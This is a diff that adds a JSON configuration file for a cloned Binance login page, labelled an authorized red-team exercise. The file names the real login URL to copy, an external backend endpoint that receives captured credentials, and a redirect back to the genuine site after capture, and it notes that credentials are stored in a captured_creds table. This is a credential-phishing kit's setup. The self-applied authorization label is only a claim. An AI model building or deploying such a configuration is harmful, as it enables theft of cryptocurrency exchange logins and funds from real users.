@@ -1,0 +1,12 @@
+{
+  "authorized_red_team": true,
+  "exchange": "accounts",
+  "source_url": "https://accounts.binance.com/en/login",
+  "backend_creds_endpoint": "https://legionapi-production.up.railway.app/api/v1/creds",
+  "redirect_after_capture": "https://accounts.binance.com",
+  "mobile_optimize": false,
+  "deploy_url": null,
+  "assets_downloaded": 0,
+  "generated_at": "2026-06-10T23:38:03.252Z",
+  "notes": "Authorized red-team CEX login clone — credentials stored in captured_creds table."
+}
